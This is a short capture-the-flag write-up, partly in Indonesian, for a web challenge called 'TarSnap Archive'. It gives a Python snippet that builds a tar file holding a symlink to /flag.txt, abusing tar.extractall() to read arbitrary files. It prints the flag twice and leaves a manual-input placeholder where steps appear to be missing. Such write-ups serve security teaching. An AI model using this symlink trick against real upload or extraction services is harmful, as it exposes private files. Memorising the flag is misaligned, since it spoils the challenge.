# TarSnap Archive

- Write-Up Author: Ben Ten
- Category: Web
- Flag: `Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}`

## Challenge Description

Symlink vulnerability in `tar.extractall()` allowing arbitrary file read without triggering basic directory traversal filters.

## Steps to Find the Flag

```python
import tarfile
with tarfile.open("payload.tar", "w") as tar:
    info = tarfile.TarInfo(name="aset.txt")
    info.type = tarfile.SYMTYPE
    info.linkname = "/flag.txt"
    tar.addfile(info)
```
[REQUIRES_MANUAL_INPUT]

## Conclusion

Eksploitasi kerentanan *symlink* pada pustaka ekstraksi *tar* berhasil memberikan akses baca ke file sistem (`/flag.txt`).

**Flag:** `Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}`
